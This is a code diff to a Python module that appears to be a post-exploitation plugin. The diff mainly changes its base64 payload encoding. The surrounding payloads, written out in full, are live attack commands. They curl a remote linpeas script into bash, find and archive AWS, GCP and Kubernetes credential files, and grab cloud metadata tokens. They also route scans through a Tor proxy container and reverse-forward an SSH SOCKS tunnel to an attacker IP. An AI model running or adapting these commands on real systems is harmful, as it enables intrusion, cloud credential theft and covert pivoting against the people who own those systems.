@@ -35,7 +35,11 @@ class Module(BaseModule):
                 session.log(message)
 
             def encode_base64(data):
-                return base64.b64encode(data.encode('utf-8')).decode()
+                try:
+                    data = data.encode('utf-8')
+                except (UnicodeDecodeError, AttributeError):
+                    pass
+                return base64.b64encode(data).decode()
 
             def run_base64_payload(session, payload, log="base64_payload", cwd="/tmp", timeout=7200):
                 encoded_payload = encode_base64(payload)
@@ -81,7 +85,7 @@ class Module(BaseModule):
 
             def enumerate():
                 # run host enumeration
-                payload = b'curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20240218-68f9adb3/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt'
+                payload = 'curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20240218-68f9adb3/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt'
                 log("payload loaded and ready")
                 result = run_base64_payload(
                     session=session, payload=payload, log="payload_linpeas")
@@ -119,26 +123,26 @@ aws configure set output json --profile=$PROFILE'''
                         session.platform.unlink('/tmp/aws_creds.tgz')
 
                     # enumerate aws creds
-                    payload = b'find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\''
+                    payload = 'find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\''
                     log("running credentials find...")
                     result = run_base64_payload(
                         session=session, payload=payload, log="payload_awscredsfind")
                     log(result)
 
                     # create an archive of all aws creds
-                    payload = b'tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\')'
+                    payload = 'tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\')'
                     log("payload loaded and ready")
                     result = run_base64_payload(
                         session=session, payload=payload, log="payload_awscreds")
                     log(result)
                 elif csp == "gcp":
                     # get instance metadata
-                    payload = b"curl \"http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text\" -H \"Metadata-Flavor: Google\" > /tmp/instance_metadata.json"
+                    payload = "curl \"http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text\" -H \"Metadata-Flavor: Google\" > /tmp/instance_metadata.json"
                     result = run_base64_payload(
                         session=session, payload=payload, log="payload_instancemetadata")
                     log(result)
                     # get instance token
-                    payload = b'''ACCESS_TOKEN=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | jq -r '.access_token')
+                    payload = '''ACCESS_TOKEN=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | jq -r '.access_token')
 echo $ACCESS_TOKEN > /tmp/instance_access_token.json
 '''
                     result = run_base64_payload(
@@ -150,21 +154,21 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                         session.platform.unlink('/tmp/aws_creds.tgz')
 
                     # enumerate gcp creds
-                    payload = b'find / \( -type f -a \( -name \'credentials.json\' -a -path \'*.config/gcloud/credentials.json\' \) \)  -printf \'%P\n\''
+                    payload = 'find / \( -type f -a \( -name \'credentials.json\' -a -path \'*.config/gcloud/credentials.json\' \) \)  -printf \'%P\n\''
                     log("running credentials find...")
                     result = run_base64_payload(
                         session=session, payload=payload, log="payload_gcpcredsfind")
                     log(result)
 
                     # create an archive of all gcp creds
-                    payload = b'tar -czvf /tmp/gcp_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials.json\' -a -path \'*.config/gcloud/credentials.json\' \) \)  -printf \'%P\n\')'
+                    payload = 'tar -czvf /tmp/gcp_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials.json\' -a -path \'*.config/gcloud/credentials.json\' \) \)  -printf \'%P\n\')'
                     log("payload loaded and ready")
                     result = run_base64_payload(
                         session=session, payload=payload, log="payload_gcpcreds")
                     log(result)
 
                 # create an archive of all kube creds
-                payload = b'tar -czvf /tmp/kube_creds.tgz -C / $(find / \( -type f -a \( -name \'config\' -a -path \'*.kube/config\' \) \)  -printf \'%P\n\')'
+                payload = 'tar -czvf /tmp/kube_creds.tgz -C / $(find / \( -type f -a \( -name \'config\' -a -path \'*.kube/config\' \) \)  -printf \'%P\n\')'
                 log("payload loaded and ready")
                 result = run_base64_payload(
                     session=session, payload=payload, log="payload_kubecreds")
@@ -192,7 +196,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     container = f'ghcr.io/credibleforce/proxychains-scoutsuite-{csp}:main'
                 try:
                     payload = encode_base64(
-                        b'docker stop torproxy || true; docker rm torproxy || true; docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy')
+                        'docker stop torproxy || true; docker rm torproxy || true; docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy')
                     log(f"Running payload: {payload}")
                     result = subprocess.run(
                         ['/bin/bash', '-c', f'echo {payload} | tee /tmp/payload_{jobname}_torproxy | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
@@ -205,7 +209,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                         log(
                             f"stopping and removing and {script} tunnelled container proxychains-{jobname}-{csp}...")
                         payload = encode_base64(
-                            f'docker rm --force proxychains-{jobname}-{csp}'.encode('utf-8'))
+                            f'docker rm --force proxychains-{jobname}-{csp}')
                         log(f"Running payload: {payload}")
                         result = subprocess.run(
                             ['/bin/bash', '-c', f'echo {payload} | tee /tmp/payload_{jobname} | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
@@ -232,7 +236,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
 
                         log(f"Starting tor tunneled docker...")
                         payload = encode_base64(
-                            f'export TORPROXY="$(docker inspect -f \'{{{{range .NetworkSettings.Networks}}}}{{{{.IPAddress}}}}{{{{end}}}}\' torproxy)"; docker run --rm --name=proxychains-{jobname}-{csp} --link torproxy:torproxy -e TORPROXY=$TORPROXY -v "/tmp":"/tmp" -v "{local_creds}":"{container_creds}" -v "{local_kube_creds}":"{container_kube_creds}" -v "{cwd}":"/{jobname}" {container} /bin/bash /{jobname}/{script} {args}'.encode('utf-8'))
+                            f'export TORPROXY="$(docker inspect -f \'{{{{range .NetworkSettings.Networks}}}}{{{{.IPAddress}}}}{{{{end}}}}\' torproxy)"; docker run --rm --name=proxychains-{jobname}-{csp} --link torproxy:torproxy -e TORPROXY=$TORPROXY -v "/tmp":"/tmp" -v "{local_creds}":"{container_creds}" -v "{local_kube_creds}":"{container_kube_creds}" -v "{cwd}":"/{jobname}" {container} /bin/bash /{jobname}/{script} {args}')
                         log(f"Running payload: {payload}")
                         result = subprocess.run(
                             ['/bin/bash', '-c', f'echo {payload} | tee /tmp/payload_{jobname} | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
@@ -252,7 +256,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                 log(f'Attacker IP: {attacker_ip}')
 
                 # get the attacker lan
-                payload = b'ip -o -f inet addr show | awk \'/scope global/ {print $4}\' | head -1'
+                payload = 'ip -o -f inet addr show | awk \'/scope global/ {print $4}\' | head -1'
                 result = run_base64_payload(
                     session=session, payload=payload, log="payload_attackerlan")
                 target_lan = bytes(result.stdout).decode().strip()
@@ -270,15 +274,14 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
 
                 # create socksproxy on target
                 log('starting socksproxy on target...')
-                payload = b'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -D 9050 localhost'
+                payload = 'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -D 9050 localhost'
                 result = run_base64_payload(
                     session=session, payload=payload, log="payload_starttargetsocks")
                 log(result)
 
                 # forward local socksproxy to attacker
                 log('forwarding target socksproxy to attacker...')
-                payload = f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -R 9050:localhost:9050 socksuser@{attacker_ip}'.encode(
-                    'utf-8')
+                payload = f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -R 9050:localhost:9050 socksuser@{attacker_ip}'
                 result = run_base64_payload(
                     session=session, payload=payload, log="payload_startattackersocks")
                 log(result)
@@ -322,14 +325,14 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                                 task_path, m.path), Path.joinpath(aws_dir, os.path.basename(m.path)))
 
                     payload = encode_base64(
-                        f'aws configure list-profiles'.encode('utf-8'))
+                        f'aws configure list-profiles')
                     log(f"Running payload: {payload}")
                     result = subprocess.run(
                         ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_checkprofiles | base64 -d | /bin/bash'], cwd=task_path, capture_output=True, text=True)
                     log(result)
 
                     payload = encode_base64(
-                        f'aws configure list --profile=default'.encode('utf-8'))
+                        f'aws configure list --profile=default')
                     log(f"Running payload: {payload}")
                     result = subprocess.run(
                         ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_checkdefault | base64 -d | /bin/bash'], cwd=task_path, capture_output=True, text=True)
@@ -420,7 +423,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                 log("credentialed_access_tor complete")
 
                 # create an archive of all kubernetes creds
-                payload = b'tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\')'
+                payload = 'tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\')'
                 log("payload loaded and ready")
                 result = run_base64_payload(
                     session=session, payload=payload, log="payload_awscreds")
